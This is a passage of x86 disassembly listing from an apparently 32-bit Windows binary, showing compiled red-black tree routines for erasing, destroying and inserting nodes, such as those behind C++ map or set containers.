   14f39:	mov    eax,DWORD PTR [ebp+0x8]
   14f3c:	mov    DWORD PTR [eax],ecx
   14f3e:	pop    esi
   14f3f:	leave  
   14f40:	ret    0xc
   14f43:	int3   
   14f44:	int3   
   14f45:	int3   
   14f46:	int3   
   14f47:	int3   
   14f48:	mov    edi,edi
   14f4a:	push   ebp
   14f4b:	mov    ebp,esp
   14f4d:	push   ecx
   14f4e:	push   ecx
   14f4f:	push   ebx
   14f50:	push   esi
   14f51:	mov    DWORD PTR [ebp-0x4],ecx
   14f54:	push   edi
   14f55:	mov    edi,DWORD PTR [ebp+0xc]
   14f58:	lea    ecx,[ebp+0xc]
   14f5b:	call   0x12ec0
   14f60:	mov    esi,DWORD PTR [edi]
   14f62:	mov    eax,ds:0x7f6d0
   14f67:	mov    ebx,edi
   14f69:	mov    DWORD PTR [ebp-0x8],esi
   14f6c:	cmp    esi,eax
   14f6e:	jne    0x14f8c
   14f70:	mov    esi,DWORD PTR [edi+0x8]
   14f73:	mov    eax,DWORD PTR [ebx+0x4]
   14f76:	mov    ecx,DWORD PTR [ebp-0x4]
   14f79:	mov    DWORD PTR [esi+0x4],eax
   14f7c:	mov    eax,DWORD PTR [ecx+0x4]
   14f7f:	cmp    DWORD PTR [eax+0x4],edi
   14f82:	jne    0x15001
   14f84:	mov    DWORD PTR [eax+0x4],esi
   14f87:	jmp    0x1500f
   14f8c:	mov    ecx,DWORD PTR [edi+0x8]
   14f8f:	cmp    ecx,eax
   14f91:	je     0x14f73
   14f93:	push   ecx
   14f94:	call   0x11268
   14f99:	mov    ebx,eax
   14f9b:	mov    esi,DWORD PTR [ebx+0x8]
   14f9e:	cmp    ebx,edi
   14fa0:	je     0x14f73
   14fa2:	mov    eax,DWORD PTR [ebp-0x8]
   14fa5:	mov    DWORD PTR [eax+0x4],ebx
   14fa8:	mov    eax,DWORD PTR [edi]
   14faa:	mov    DWORD PTR [ebx],eax
   14fac:	cmp    ebx,DWORD PTR [edi+0x8]
   14faf:	jne    0x14fb6
   14fb1:	mov    DWORD PTR [esi+0x4],ebx
   14fb4:	jmp    0x14fcd
   14fb6:	mov    eax,DWORD PTR [ebx+0x4]
   14fb9:	mov    DWORD PTR [esi+0x4],eax
   14fbc:	mov    eax,DWORD PTR [ebx+0x4]
   14fbf:	mov    DWORD PTR [eax],esi
   14fc1:	mov    eax,DWORD PTR [edi+0x8]
   14fc4:	mov    DWORD PTR [ebx+0x8],eax
   14fc7:	mov    eax,DWORD PTR [edi+0x8]
   14fca:	mov    DWORD PTR [eax+0x4],ebx
   14fcd:	mov    eax,DWORD PTR [ebp-0x4]
   14fd0:	mov    eax,DWORD PTR [eax+0x4]
   14fd3:	cmp    DWORD PTR [eax+0x4],edi
   14fd6:	jne    0x14fdd
   14fd8:	mov    DWORD PTR [eax+0x4],ebx
   14fdb:	jmp    0x14feb
   14fdd:	mov    eax,DWORD PTR [edi+0x4]
   14fe0:	cmp    DWORD PTR [eax],edi
   14fe2:	jne    0x14fe8
   14fe4:	mov    DWORD PTR [eax],ebx
   14fe6:	jmp    0x14feb
   14fe8:	mov    DWORD PTR [eax+0x8],ebx
   14feb:	mov    eax,DWORD PTR [edi+0x4]
   14fee:	mov    DWORD PTR [ebx+0x4],eax
   14ff1:	mov    eax,DWORD PTR [ebx+0x70]
   14ff4:	mov    ecx,DWORD PTR [edi+0x70]
   14ff7:	mov    DWORD PTR [ebx+0x70],ecx
   14ffa:	mov    DWORD PTR [edi+0x70],eax
   14ffd:	mov    ebx,edi
   14fff:	jmp    0x15062
   15001:	mov    eax,DWORD PTR [edi+0x4]
   15004:	cmp    DWORD PTR [eax],edi
   15006:	jne    0x1500c
   15008:	mov    DWORD PTR [eax],esi
   1500a:	jmp    0x1500f
   1500c:	mov    DWORD PTR [eax+0x8],esi
   1500f:	mov    eax,DWORD PTR [ecx+0x4]
   15012:	mov    DWORD PTR [ebp-0x8],eax
   15015:	cmp    DWORD PTR [eax],edi
   15017:	jne    0x15039
   15019:	mov    edx,DWORD PTR [edi+0x8]
   1501c:	cmp    edx,DWORD PTR ds:0x7f6d0
   15022:	jne    0x1502b
   15024:	mov    edx,DWORD PTR [edi+0x4]
   15027:	mov    DWORD PTR [eax],edx
   15029:	jmp    0x15039
   1502b:	push   esi
   1502c:	call   0x11268
   15031:	mov    ecx,DWORD PTR [ebp-0x8]
   15034:	mov    DWORD PTR [ecx],eax
   15036:	mov    ecx,DWORD PTR [ebp-0x4]
   15039:	mov    eax,DWORD PTR [ecx+0x4]
   1503c:	mov    DWORD PTR [ebp-0x8],eax
   1503f:	cmp    DWORD PTR [eax+0x8],edi
   15042:	jne    0x15062
   15044:	mov    ecx,DWORD PTR [edi]
   15046:	cmp    ecx,DWORD PTR ds:0x7f6d0
   1504c:	jne    0x15056
   1504e:	mov    ecx,DWORD PTR [edi+0x4]
   15051:	mov    DWORD PTR [eax+0x8],ecx
   15054:	jmp    0x15062
   15056:	push   esi
   15057:	call   0x11246
   1505c:	mov    ecx,DWORD PTR [ebp-0x8]
   1505f:	mov    DWORD PTR [ecx+0x8],eax
   15062:	xor    edi,edi
   15064:	inc    edi
   15065:	cmp    DWORD PTR [ebx+0x70],edi
   15068:	jne    0x1517f
   1506e:	jmp    0x1512d
   15073:	cmp    DWORD PTR [esi+0x70],edi
   15076:	jne    0x1517c
   1507c:	mov    eax,DWORD PTR [esi+0x4]
   1507f:	cmp    esi,DWORD PTR [eax]
   15081:	jne    0x150f8
   15083:	mov    eax,DWORD PTR [eax+0x8]
   15086:	cmp    DWORD PTR [eax+0x70],0x0
   1508a:	jne    0x150a4
   1508c:	mov    DWORD PTR [eax+0x70],edi
   1508f:	mov    eax,DWORD PTR [esi+0x4]
   15092:	and    DWORD PTR [eax+0x70],0x0
   15096:	push   DWORD PTR [esi+0x4]
   15099:	call   0x1304a
   1509e:	mov    eax,DWORD PTR [esi+0x4]
   150a1:	mov    eax,DWORD PTR [eax+0x8]
   150a4:	mov    ecx,DWORD PTR [eax]
   150a6:	cmp    DWORD PTR [ecx+0x70],edi
   150a9:	jne    0x150b3
   150ab:	mov    ecx,DWORD PTR [eax+0x8]
   150ae:	cmp    DWORD PTR [ecx+0x70],edi
   150b1:	je     0x15126
   150b3:	mov    ecx,DWORD PTR [eax+0x8]
   150b6:	cmp    DWORD PTR [ecx+0x70],edi
   150b9:	jne    0x150d3
   150bb:	mov    ecx,DWORD PTR [eax]
   150bd:	mov    DWORD PTR [ecx+0x70],edi
   150c0:	mov    ecx,DWORD PTR [ebp-0x4]
   150c3:	and    DWORD PTR [eax+0x70],0x0
   150c7:	push   eax
   150c8:	call   0x13098
   150cd:	mov    eax,DWORD PTR [esi+0x4]
   150d0:	mov    eax,DWORD PTR [eax+0x8]
   150d3:	mov    ecx,DWORD PTR [esi+0x4]
   150d6:	mov    ecx,DWORD PTR [ecx+0x70]
   150d9:	mov    DWORD PTR [eax+0x70],ecx
   150dc:	mov    ecx,DWORD PTR [esi+0x4]
   150df:	mov    DWORD PTR [ecx+0x70],edi
   150e2:	mov    eax,DWORD PTR [eax+0x8]
   150e5:	mov    ecx,DWORD PTR [ebp-0x4]
   150e8:	mov    DWORD PTR [eax+0x70],edi
   150eb:	push   DWORD PTR [esi+0x4]
   150ee:	call   0x1304a
   150f3:	jmp    0x1517c
   150f8:	mov    eax,DWORD PTR [eax]
   150fa:	cmp    DWORD PTR [eax+0x70],0x0
   150fe:	jne    0x15117
   15100:	mov    DWORD PTR [eax+0x70],edi
   15103:	mov    eax,DWORD PTR [esi+0x4]
   15106:	and    DWORD PTR [eax+0x70],0x0
   1510a:	push   DWORD PTR [esi+0x4]
   1510d:	call   0x13098
   15112:	mov    eax,DWORD PTR [esi+0x4]
   15115:	mov    eax,DWORD PTR [eax]
   15117:	mov    ecx,DWORD PTR [eax+0x8]
   1511a:	cmp    DWORD PTR [ecx+0x70],edi
   1511d:	jne    0x1513e
   1511f:	mov    ecx,DWORD PTR [eax]
   15121:	cmp    DWORD PTR [ecx+0x70],edi
   15124:	jne    0x1513e
   15126:	and    DWORD PTR [eax+0x70],0x0
   1512a:	mov    esi,DWORD PTR [esi+0x4]
   1512d:	mov    ecx,DWORD PTR [ebp-0x4]
   15130:	mov    eax,DWORD PTR [ecx+0x4]
   15133:	cmp    esi,DWORD PTR [eax+0x4]
   15136:	jne    0x15073
   1513c:	jmp    0x1517c
   1513e:	mov    ecx,DWORD PTR [eax]
   15140:	cmp    DWORD PTR [ecx+0x70],edi
   15143:	jne    0x1515d
   15145:	mov    ecx,DWORD PTR [eax+0x8]
   15148:	mov    DWORD PTR [ecx+0x70],edi
   1514b:	mov    ecx,DWORD PTR [ebp-0x4]
   1514e:	and    DWORD PTR [eax+0x70],0x0
   15152:	push   eax
   15153:	call   0x1304a
   15158:	mov    eax,DWORD PTR [esi+0x4]
   1515b:	mov    eax,DWORD PTR [eax]
   1515d:	mov    ecx,DWORD PTR [esi+0x4]
   15160:	mov    ecx,DWORD PTR [ecx+0x70]
   15163:	mov    DWORD PTR [eax+0x70],ecx
   15166:	mov    ecx,DWORD PTR [esi+0x4]
   15169:	mov    DWORD PTR [ecx+0x70],edi
   1516c:	mov    eax,DWORD PTR [eax]
   1516e:	mov    ecx,DWORD PTR [ebp-0x4]
   15171:	mov    DWORD PTR [eax+0x70],edi
   15174:	push   DWORD PTR [esi+0x4]
   15177:	call   0x13098
   1517c:	mov    DWORD PTR [esi+0x70],edi
   1517f:	lea    eax,[ebx+0x10]
   15182:	push   eax
   15183:	call   0x13b00
   15188:	push   ebx
   15189:	call   0x10a9a
   1518e:	mov    eax,DWORD PTR [ebp-0x4]
   15191:	dec    DWORD PTR [eax+0xc]
   15194:	mov    eax,DWORD PTR [ebp+0x8]
   15197:	pop    ecx
   15198:	mov    ecx,DWORD PTR [ebp+0xc]
   1519b:	pop    edi
   1519c:	pop    esi
   1519d:	mov    DWORD PTR [eax],ecx
   1519f:	pop    ebx
   151a0:	leave  
   151a1:	ret    0x8
   151a4:	int3   
   151a5:	int3   
   151a6:	int3   
   151a7:	int3   
   151a8:	int3   
   151a9:	int3   
   151aa:	mov    edi,edi
   151ac:	push   ebp
   151ad:	mov    ebp,esp
   151af:	push   ebx
   151b0:	push   esi
   151b1:	push   edi
   151b2:	mov    edi,DWORD PTR [ebp+0x8]
   151b5:	mov    ebx,ecx
   151b7:	mov    esi,edi
   151b9:	cmp    edi,DWORD PTR ds:0x7f6d0
   151bf:	je     0x151e7
   151c1:	push   DWORD PTR [esi+0x8]
   151c4:	mov    ecx,ebx
   151c6:	call   0x151aa
   151cb:	mov    esi,DWORD PTR [esi]
   151cd:	lea    eax,[edi+0x10]
   151d0:	push   eax
   151d1:	call   0x13b00
   151d6:	push   edi
   151d7:	call   0x10a9a
   151dc:	pop    ecx
   151dd:	mov    edi,esi
   151df:	cmp    esi,DWORD PTR ds:0x7f6d0
   151e5:	jne    0x151c1
   151e7:	pop    edi
   151e8:	pop    esi
   151e9:	pop    ebx
   151ea:	pop    ebp
   151eb:	ret    0x4
   151ee:	int3   
   151ef:	int3   
   151f0:	int3   
   151f1:	int3   
   151f2:	int3   
   151f3:	int3   
   151f4:	mov    edi,edi
   151f6:	push   ebp
   151f7:	mov    ebp,esp
   151f9:	push   ebx
   151fa:	push   esi
   151fb:	mov    esi,DWORD PTR [ebp+0x10]
   151fe:	push   edi
   151ff:	push   0x0
   15201:	push   esi
   15202:	mov    edi,ecx
   15204:	call   0x139c8
   15209:	push   DWORD PTR [ebp+0x14]
   1520c:	mov    ebx,eax
   1520e:	mov    eax,ds:0x7f6d0
   15213:	mov    DWORD PTR [ebx],eax
   15215:	mov    eax,ds:0x7f6d0
   1521a:	mov    DWORD PTR [ebx+0x8],eax
   1521d:	lea    eax,[ebx+0x10]
   15220:	push   eax
   15221:	call   0x13ac4
   15226:	inc    DWORD PTR [edi+0xc]
   15229:	cmp    esi,DWORD PTR [edi+0x4]
   1522c:	je     0x15256
   1522e:	mov    eax,DWORD PTR [ebp+0xc]
   15231:	cmp    eax,DWORD PTR ds:0x7f6d0
   15237:	jne    0x15256
   15239:	lea    eax,[esi+0x10]
   1523c:	push   eax
   1523d:	push   DWORD PTR [ebp+0x14]
   15240:	call   0x19804
   15245:	test   al,al
   15247:	jne    0x15256
   15249:	mov    DWORD PTR [esi+0x8],ebx
   1524c:	mov    eax,DWORD PTR [edi+0x4]
   1524f:	cmp    esi,DWORD PTR [eax+0x8]
   15252:	jne    0x15270
   15254:	jmp    0x15265
   15256:	mov    DWORD PTR [esi],ebx
   15258:	mov    eax,DWORD PTR [edi+0x4]
   1525b:	cmp    esi,eax
   1525d:	jne    0x1526a
   1525f:	mov    DWORD PTR [eax+0x4],ebx
   15262:	mov    eax,DWORD PTR [edi+0x4]
   15265:	mov    DWORD PTR [eax+0x8],ebx
   15268:	jmp    0x15270
   1526a:	cmp    esi,DWORD PTR [eax]
   1526c:	jne    0x15270
   1526e:	mov    DWORD PTR [eax],ebx
   15270:	mov    eax,DWORD PTR [edi+0x4]
   15273:	mov    esi,ebx
   15275:	cmp    ebx,DWORD PTR [eax+0x4]
   15278:	je     0x1532c
   1527e:	mov    eax,DWORD PTR [esi+0x4]
   15281:	xor    edx,edx
   15283:	cmp    DWORD PTR [eax+0x70],edx
   15286:	jne    0x1532c
   1528c:	mov    ecx,DWORD PTR [eax+0x4]
   1528f:	cmp    eax,DWORD PTR [ecx]
   15291:	jne    0x152cd
   15293:	mov    ecx,DWORD PTR [ecx+0x8]
   15296:	cmp    DWORD PTR [ecx+0x70],edx
   15299:	je     0x152d4
   1529b:	cmp    esi,DWORD PTR [eax+0x8]
   1529e:	jne    0x152aa
   152a0:	mov    esi,eax
   152a2:	push   esi
   152a3:	mov    ecx,edi
   152a5:	call   0x1304a
   152aa:	mov    eax,DWORD PTR [esi+0x4]
   152ad:	mov    DWORD PTR [eax+0x70],0x1
   152b4:	mov    eax,DWORD PTR [esi+0x4]
   152b7:	mov    eax,DWORD PTR [eax+0x4]
   152ba:	and    DWORD PTR [eax+0x70],0x0
   152be:	mov    eax,DWORD PTR [esi+0x4]
   152c1:	push   DWORD PTR [eax+0x4]
   152c4:	mov    ecx,edi
   152c6:	call   0x13098
   152cb:	jmp    0x15320
   152cd:	mov    ecx,DWORD PTR [ecx]
   152cf:	cmp    DWORD PTR [ecx+0x70],edx
   152d2:	jne    0x152f1
   152d4:	mov    edx,eax
   152d6:	xor    eax,eax
   152d8:	inc    eax
   152d9:	mov    DWORD PTR [edx+0x70],eax
   152dc:	mov    DWORD PTR [ecx+0x70],eax
   152df:	mov    eax,DWORD PTR [esi+0x4]
   152e2:	mov    eax,DWORD PTR [eax+0x4]
   152e5:	and    DWORD PTR [eax+0x70],0x0
   152e9:	mov    eax,DWORD PTR [esi+0x4]
   152ec:	mov    esi,DWORD PTR [eax+0x4]
   152ef:	jmp    0x15320
   152f1:	cmp    esi,DWORD PTR [eax]
   152f3:	jne    0x152ff
   152f5:	mov    esi,eax
   152f7:	push   esi
   152f8:	mov    ecx,edi
   152fa:	call   0x13098
   152ff:	mov    eax,DWORD PTR [esi+0x4]
   15302:	mov    DWORD PTR [eax+0x70],0x1
   15309:	mov    eax,DWORD PTR [esi+0x4]
   1530c:	mov    eax,DWORD PTR [eax+0x4]
   1530f:	and    DWORD PTR [eax+0x70],0x0
   15313:	mov    eax,DWORD PTR [esi+0x4]
   15316:	push   DWORD PTR [eax+0x4]
   15319:	mov    ecx,edi
   1531b:	call   0x1304a
   15320:	mov    eax,DWORD PTR [edi+0x4]
   15323:	cmp    esi,DWORD PTR [eax+0x4]
   15326:	jne    0x1527e
   1532c:	mov    eax,DWORD PTR [edi+0x4]
   1532f:	mov    eax,DWORD PTR [eax+0x4]
   15332:	pop    edi
   15333:	mov    DWORD PTR [eax+0x70],0x1
   1533a:	mov    eax,DWORD PTR [ebp+0x8]
   1533d:	pop    esi
   1533e:	mov    DWORD PTR [eax],ebx
   15340:	pop    ebx
   15341:	pop    ebp
   15342:	ret    0x10
   15345:	int3   
   15346:	int3   
   15347:	int3   
   15348:	int3   
   15349:	int3   
   1534a:	mov    edi,edi
   1534c:	push   ebp
   1534d:	mov    ebp,esp
   1534f:	push   ecx
   15350:	push   ecx
   15351:	push   ebx
   15352:	push   esi
   15353:	mov    DWORD PTR [ebp-0x4],ecx
   15356:	push   edi
   15357:	mov    edi,DWORD PTR [ebp+0xc]
   1535a:	lea    ecx,[ebp+0xc]
   1535d:	call   0x1387e
   15362:	mov    esi,DWORD PTR [edi]
   15364:	mov    eax,ds:0x7f6d4
   15369:	mov    ebx,edi
   1536b:	mov    DWORD PTR [ebp-0x8],esi
   1536e:	cmp    esi,eax
   15370:	jne    0x1538e
   15372:	mov    esi,DWORD PTR [edi+0x8]
   15375:	mov    eax,DWORD PTR [ebx+0x4]
   15378:	mov    ecx,DWORD PTR [ebp-0x4]
   1537b:	mov    DWORD PTR [esi+0x4],eax
   1537e:	mov    eax,DWORD PTR [ecx+0x4]
   15381:	cmp    DWORD PTR [eax+0x4],edi
   15384:	jne    0x15403
   15386:	mov    DWORD PTR [eax+0x4],esi
   15389:	jmp    0x15411
   1538e:	mov    ecx,DWORD PTR [edi+0x8]
   15391:	cmp    ecx,eax
   15393:	je     0x15375
   15395:	push   ecx
   15396:	call   0x12d10
   1539b:	mov    ebx,eax
   1539d:	mov    esi,DWORD PTR [ebx+0x8]
   153a0:	cmp    ebx,edi
   153a2:	je     0x15375
   153a4:	mov    eax,DWORD PTR [ebp-0x8]
   153a7:	mov    DWORD PTR [eax+0x4],ebx
   153aa:	mov    eax,DWORD PTR [edi]
   153ac:	mov    DWORD PTR [ebx],eax
   153ae:	cmp    ebx,DWORD PTR [edi+0x8]
   153b1:	jne    0x153b8
   153b3:	mov    DWORD PTR [esi+0x4],ebx
   153b6:	jmp    0x153cf
   153b8:	mov    eax,DWORD PTR [ebx+0x4]
   153bb:	mov    DWORD PTR [esi+0x4],eax
   153be:	mov    eax,DWORD PTR [ebx+0x4]
   153c1:	mov    DWORD PTR [eax],esi
   153c3:	mov    eax,DWORD PTR [edi+0x8]
   153c6:	mov    DWORD PTR [ebx+0x8],eax
   153c9:	mov    eax,DWORD PTR [edi+0x8]
   153cc:	mov    DWORD PTR [eax+0x4],ebx
   153cf:	mov    eax,DWORD PTR [ebp-0x4]
   153d2:	mov    eax,DWORD PTR [eax+0x4]
   153d5:	cmp    DWORD PTR [eax+0x4],edi
   153d8:	jne    0x153df
   153da:	mov    DWORD PTR [eax+0x4],ebx
   153dd:	jmp    0x153ed
   153df:	mov    eax,DWORD PTR [edi+0x4]
   153e2:	cmp    DWORD PTR [eax],edi
   153e4:	jne    0x153ea
   153e6:	mov    DWORD PTR [eax],ebx
   153e8:	jmp    0x153ed
   153ea:	mov    DWORD PTR [eax+0x8],ebx
   153ed:	mov    eax,DWORD PTR [edi+0x4]
   153f0:	mov    DWORD PTR [ebx+0x4],eax
   153f3:	mov    eax,DWORD PTR [ebx+0x68]
   153f6:	mov    ecx,DWORD PTR [edi+0x68]
   153f9:	mov    DWORD PTR [ebx+0x68],ecx
   153fc:	mov    DWORD PTR [edi+0x68],eax
   153ff:	mov    ebx,edi
   15401:	jmp    0x15464
   15403:	mov    eax,DWORD PTR [edi+0x4]
   15406:	cmp    DWORD PTR [eax],edi
   15408:	jne    0x1540e
   1540a:	mov    DWORD PTR [eax],esi
   1540c:	jmp    0x15411
   1540e:	mov    DWORD PTR [eax+0x8],esi
   15411:	mov    eax,DWORD PTR [ecx+0x4]
   15414:	mov    DWORD PTR [ebp-0x8],eax
   15417:	cmp    DWORD PTR [eax],edi
   15419:	jne    0x1543b
   1541b:	mov    edx,DWORD PTR [edi+0x8]
   1541e:	cmp    edx,DWORD PTR ds:0x7f6d4
   15424:	jne    0x1542d
   15426:	mov    edx,DWORD PTR [edi+0x4]
   15429:	mov    DWORD PTR [eax],edx
   1542b:	jmp    0x1543b
   1542d:	push   esi
   1542e:	call   0x12d10
   15433:	mov    ecx,DWORD PTR [ebp-0x8]
   15436:	mov    DWORD PTR [ecx],eax
   15438:	mov    ecx,DWORD PTR [ebp-0x4]
   1543b:	mov    eax,DWORD PTR [ecx+0x4]
   1543e:	mov    DWORD PTR [ebp-0x8],eax
   15441:	cmp    DWORD PTR [eax+0x8],edi
   15444:	jne    0x15464
   15446:	mov    ecx,DWORD PTR [edi]
   15448:	cmp    ecx,DWORD PTR ds:0x7f6d4
   1544e:	jne    0x15458
   15450:	mov    ecx,DWORD PTR [edi+0x4]
   15453:	mov    DWORD PTR [eax+0x8],ecx
   15456:	jmp    0x15464
   15458:	push   esi
   15459:	call   0x1134e
   1545e:	mov    ecx,DWORD PTR [ebp-0x8]
   15461:	mov    DWORD PTR [ecx+0x8],eax
   15464:	xor    edi,edi
   15466:	inc    edi
   15467:	cmp    DWORD PTR [ebx+0x68],edi
   1546a:	jne    0x15581
   15470:	jmp    0x1552f
   15475:	cmp    DWORD PTR [esi+0x68],edi
   15478:	jne    0x1557e
   1547e:	mov    eax,DWORD PTR [esi+0x4]
   15481:	cmp    esi,DWORD PTR [eax]
   15483:	jne    0x154fa
   15485:	mov    eax,DWORD PTR [eax+0x8]
   15488:	cmp    DWORD PTR [eax+0x68],0x0
   1548c:	jne    0x154a6
   1548e:	mov    DWORD PTR [eax+0x68],edi
   15491:	mov    eax,DWORD PTR [esi+0x4]
   15494:	and    DWORD PTR [eax+0x68],0x0
   15498:	push   DWORD PTR [esi+0x4]
   1549b:	call   0x11300
   154a0:	mov    eax,DWORD PTR [esi+0x4]
   154a3:	mov    eax,DWORD PTR [eax+0x8]
   154a6:	mov    ecx,DWORD PTR [eax]
   154a8:	cmp    DWORD PTR [ecx+0x68],edi
   154ab:	jne    0x154b5
   154ad:	mov    ecx,DWORD PTR [eax+0x8]
   154b0:	cmp    DWORD PTR [ecx+0x68],edi
   154b3:	je     0x15528
   154b5:	mov    ecx,DWORD PTR [eax+0x8]
   154b8:	cmp    DWORD PTR [ecx+0x68],edi
   154bb:	jne    0x154d5
   154bd:	mov    ecx,DWORD PTR [eax]
   154bf:	mov    DWORD PTR [ecx+0x68],edi
   154c2:	mov    ecx,DWORD PTR [ebp-0x4]
   154c5:	and    DWORD PTR [eax+0x68],0x0
   154c9:	push   eax
   154ca:	call   0x11370
   154cf:	mov    eax,DWORD PTR [esi+0x4]
   154d2:	mov    eax,DWORD PTR [eax+0x8]
   154d5:	mov    ecx,DWORD PTR [esi+0x4]
   154d8:	mov    ecx,DWORD PTR [ecx+0x68]
   154db:	mov    DWORD PTR [eax+0x68],ecx
   154de:	mov    ecx,DWORD PTR [esi+0x4]
   154e1:	mov    DWORD PTR [ecx+0x68],edi
   154e4:	mov    eax,DWORD PTR [eax+0x8]
   154e7:	mov    ecx,DWORD PTR [ebp-0x4]
   154ea:	mov    DWORD PTR [eax+0x68],edi
   154ed:	push   DWORD PTR [esi+0x4]
   154f0:	call   0x11300
   154f5:	jmp    0x1557e
   154fa:	mov    eax,DWORD PTR [eax]
   154fc:	cmp    DWORD PTR [eax+0x68],0x0
   15500:	jne    0x15519
   15502:	mov    DWORD PTR [eax+0x68],edi
   15505:	mov    eax,DWORD PTR [esi+0x4]
   15508:	and    DWORD PTR [eax+0x68],0x0
   1550c:	push   DWORD PTR [esi+0x4]
   1550f:	call   0x11370
   15514:	mov    eax,DWORD PTR [esi+0x4]
   15517:	mov    eax,DWORD PTR [eax]
   15519:	mov    ecx,DWORD PTR [eax+0x8]
   1551c:	cmp    DWORD PTR [ecx+0x68],edi
   1551f:	jne    0x15540
   15521:	mov    ecx,DWORD PTR [eax]
   15523:	cmp    DWORD PTR [ecx+0x68],edi
   15526:	jne    0x15540
   15528:	and    DWORD PTR [eax+0x68],0x0
   1552c:	mov    esi,DWORD PTR [esi+0x4]
   1552f:	mov    ecx,DWORD PTR [ebp-0x4]
   15532:	mov    eax,DWORD PTR [ecx+0x4]
   15535:	cmp    esi,DWORD PTR [eax+0x4]
   15538:	jne    0x15475
   1553e:	jmp    0x1557e
   15540:	mov    ecx,DWORD PTR [eax]
   15542:	cmp    DWORD PTR [ecx+0x68],edi
   15545:	jne    0x1555f
   15547:	mov    ecx,DWORD PTR [eax+0x8]
   1554a:	mov    DWORD PTR [ecx+0x68],edi
   1554d:	mov    ecx,DWORD PTR [ebp-0x4]
   15550:	and    DWORD PTR [eax+0x68],0x0
   15554:	push   eax
   15555:	call   0x11300
   1555a:	mov    eax,DWORD PTR [esi+0x4]
   1555d:	mov    eax,DWORD PTR [eax]
   1555f:	mov    ecx,DWORD PTR [esi+0x4]
   15562:	mov    ecx,DWORD PTR [ecx+0x68]
   15565:	mov    DWORD PTR [eax+0x68],ecx
   15568:	mov    ecx,DWORD PTR [esi+0x4]
   1556b:	mov    DWORD PTR [ecx+0x68],edi
   1556e:	mov    eax,DWORD PTR [eax]
   15570:	mov    ecx,DWORD PTR [ebp-0x4]
   15573:	mov    DWORD PTR [eax+0x68],edi
   15576:	push   DWORD PTR [esi+0x4]
   15579:	call   0x11370
   1557e:	mov    DWORD PTR [esi+0x68],edi
   15581:	lea    eax,[ebx+0x10]
   15584:	push   eax
   15585:	call   0x13b00
   1558a:	push   ebx
   1558b:	call   0x10a9a
   15590:	mov    eax,DWORD PTR [ebp-0x4]
   15593:	dec    DWORD PTR [eax+0xc]
   15596:	mov    eax,DWORD PTR [ebp+0x8]
   15599:	pop    ecx
   1559a:	mov    ecx,DWORD PTR [ebp+0xc]
   1559d:	pop    edi
   1559e:	pop    esi
   1559f:	mov    DWORD PTR [eax],ecx
   155a1:	pop    ebx
   155a2:	leave  
   155a3:	ret    0x8
   155a6:	int3   
   155a7:	int3   
   155a8:	int3   
   155a9:	int3   
   155aa:	int3   
   155ab:	int3   
   155ac:	mov    edi,edi
   155ae:	push   ebp
   155af:	mov    ebp,esp
   155b1:	push   ebx
   155b2:	push   esi
   155b3:	push   edi
   155b4:	mov    edi,DWORD PTR [ebp+0x8]
   155b7:	mov    ebx,ecx
   155b9:	mov    esi,edi
   155bb:	cmp    edi,DWORD PTR ds:0x7f6d4
   155c1:	je     0x155e9
   155c3:	push   DWORD PTR [esi+0x8]
   155c6:	mov    ecx,ebx
   155c8:	call   0x155ac
   155cd:	mov    esi,DWORD PTR [esi]
   155cf:	lea    eax,[edi+0x10]
   155d2:	push   eax
   155d3:	call   0x13b00
   155d8:	push   edi
   155d9:	call   0x10a9a
   155de:	pop    ecx
   155df:	mov    edi,esi
   155e1:	cmp    esi,DWORD PTR ds:0x7f6d4
   155e7:	jne    0x155c3
   155e9:	pop    edi
   155ea:	pop    esi
   155eb:	pop    ebx
   155ec:	pop    ebp
   155ed:	ret    0x4
   155f0:	int3   
   155f1:	int3   
   155f2:	int3   
   155f3:	int3   
   155f4:	int3   
   155f5:	int3   
   155f6:	mov    edi,edi
   155f8:	push   ebp
   155f9:	mov    ebp,esp
   155fb:	push   ebx
   155fc:	push   esi
   155fd:	mov    esi,DWORD PTR [ebp+0x10]
   15600:	push   edi
   15601:	push   0x0
   15603:	push   esi
   15604:	mov    edi,ecx
   15606:	call   0x13980
   1560b:	push   DWORD PTR [ebp+0x14]
   1560e:	mov    ebx,eax
   15610:	mov    eax,ds:0x7f6d4
   15615:	mov    DWORD PTR [ebx],eax
   15617:	mov    eax,ds:0x7f6d4
   1561c:	mov    DWORD PTR [ebx+0x8],eax
   1561f:	lea    eax,[ebx+0x10]
   15622:	push   eax
   15623:	call   0x13ae2
   15628:	inc    DWORD PTR [edi+0xc]
   1562b:	cmp    esi,DWORD PTR [edi+0x4]
   1562e:	je     0x15658
   15630:	mov    eax,DWORD PTR [ebp+0xc]
   15633:	cmp    eax,DWORD PTR ds:0x7f6d4
   15639:	jne    0x15658
   1563b:	lea    eax,[esi+0x10]
   1563e:	push   eax
   1563f:	push   DWORD PTR [ebp+0x14]
   15642:	call   0x19804
   15647:	test   al,al
   15649:	jne    0x15658
   1564b:	mov    DWORD PTR [esi+0x8],ebx
   1564e:	mov    eax,DWORD PTR [edi+0x4]
   15651:	cmp    esi,DWORD PTR [eax+0x8]
   15654:	jne    0x15672
   15656:	jmp    0x15667
   15658:	mov    DWORD PTR [esi],ebx
   1565a:	mov    eax,DWORD PTR [edi+0x4]
   1565d:	cmp    esi,eax
   1565f:	jne    0x1566c
   15661:	mov    DWORD PTR [eax+0x4],ebx
   15664:	mov    eax,DWORD PTR [edi+0x4]
   15667:	mov    DWORD PTR [eax+0x8],ebx
   1566a:	jmp    0x15672
   1566c:	cmp    esi,DWORD PTR [eax]
   1566e:	jne    0x15672
   15670:	mov    DWORD PTR [eax],ebx
   15672:	mov    eax,DWORD PTR [edi+0x4]
   15675:	mov    esi,ebx
   15677:	cmp    ebx,DWORD PTR [eax+0x4]
   1567a:	je     0x1572e
   15680:	mov    eax,DWORD PTR [esi+0x4]
   15683:	xor    edx,edx
   15685:	cmp    DWORD PTR [eax+0x68],edx
   15688:	jne    0x1572e
   1568e:	mov    ecx,DWORD PTR [eax+0x4]
   15691:	cmp    eax,DWORD PTR [ecx]
   15693:	jne    0x156cf
   15695:	mov    ecx,DWORD PTR [ecx+0x8]
   15698:	cmp    DWORD PTR [ecx+0x68],edx
   1569b:	je     0x156d6
   1569d:	cmp    esi,DWORD PTR [eax+0x8]
   156a0:	jne    0x156ac
   156a2:	mov    esi,eax
   156a4:	push   esi
   156a5:	mov    ecx,edi
   156a7:	call   0x11300
   156ac:	mov    eax,DWORD PTR [esi+0x4]
   156af:	mov    DWORD PTR [eax+0x68],0x1
   156b6:	mov    eax,DWORD PTR [esi+0x4]
   156b9:	mov    eax,DWORD PTR [eax+0x4]
   156bc:	and    DWORD PTR [eax+0x68],0x0
